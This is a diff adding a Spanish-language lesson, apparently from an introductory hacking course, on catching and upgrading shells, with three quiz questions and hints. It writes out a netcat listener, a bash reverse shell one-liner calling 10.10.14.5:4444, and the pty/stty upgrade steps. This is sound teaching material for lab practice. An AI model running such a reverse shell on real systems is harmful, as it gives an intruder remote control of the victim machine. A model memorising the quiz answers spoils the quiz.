@@ -1,0 +1,55 @@
+---
+index: 3
+title: "Shells: interactivas, inversas y el arte de mejorarlas"
+questions:
+  - id: explotacion-basica-t03-q01
+    prompt: "¿Qué programa usas en tu máquina para RECIBIR una reverse shell en el puerto 4444?"
+    hint: "El 'cuchillo suizo' de red; escucha con -lvnp."
+    kind: text
+  - id: explotacion-basica-t03-q02
+    prompt: "¿Por qué una reverse shell suele funcionar mejor que una bind shell en redes con firewall?"
+    hint: "¿Qué conexiones filtra típicamente un firewall corporativo: entrantes o salientes?"
+    kind: text
+  - id: explotacion-basica-t03-q03
+    prompt: "Con una shell básica, ¿qué comando la convierte en interactiva completa (con historial y Ctrl+C que no la mata)?"
+    hint: "El trío: python -c 'import pty'... + export TERM=xterm"
+    kind: text
+---
+
+## Tu primera shell
+
+Una **shell** es código ejecutándose en la víctima que te da línea de comandos.
+La forma clásica de capturarla:
+
+```bash
+# En TU máquina (el "oyente"):
+nc -lvnp 4444
+```
+
+Y provocas en la víctima (via RCE, upload, etc.) algo como:
+
+```bash
+bash -i >& /dev/tcp/10.10.14.5/4444 0>&1      # reverse shell bash
+```
+
+Chuleta de one-liners por lenguaje (bash/php/python/perl/powershell):
+**revshells.com** — el generador que todo el mundo tiene abierto en una pestaña.
+
+## Mejorar la shell (primer rito de paso)
+
+```bash
+python3 -c 'import pty; pty.spawn("/bin/bash")'   # pseudo-terminal
+export TERM=xterm                                  # colores y clear
+# Ctrl+Z, luego en tu terminal:
+stty raw -echo; fg
+stty rows 40 cols 120
+```
+
+Con esto tienes flechas, historial, TAB y Ctrl+C que no cierra la sesión. En labs
+lo harás tantas veces que acabará saliendo solo.
+
+## Y ahora, a escalar
+
+La shell inicial suele ser de usuario limitado (www-data, service). La escalada de
+privilegios (local) es el tema del siguiente módulo — y lo que ya intuyes de Linux
+(SUID, sudo -l, cron) y Windows (UAC, servicios) te servirá directo.
